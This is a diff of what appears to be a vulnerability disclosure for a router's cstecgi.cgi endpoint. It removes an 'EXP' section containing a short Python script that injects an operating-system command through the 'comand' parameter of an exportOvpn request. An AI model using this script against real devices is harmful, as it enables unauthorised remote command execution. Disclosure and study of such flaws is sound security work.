@@ -49,39 +49,6 @@ Content-Length: 5
 aaaaa
 ```
 
-#### EXP
-
-```
-import sys
-import requests
-import json
-command=sys.argv[1]
-try:
-	ip=sys.argv[1]
-	port=sys.argv[2]
-	command=sys.argv[3]
-except:
-	print "nonono! cant't do this"
-	print "please use python exp.py [ip] [port] [command]"
-	exit()
-url="http://%s:%s/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;%s;&filetype=gz"%(ip,port,command)
-
-
-headers={
-	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
-	"Accept-Language":"en-US,en;q=0.5",
-	"Accept-Encoding":"gzip, deflate",
-	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
-	"X-Requested-With":"XMLHttpRequest",
-	"Origin":"http://%s:%s"%(ip,port),
-}
-
-
-requests.post(url,headers=headers)
-```
-
-
-
 ### Vulnerability2
 
 #### Detail
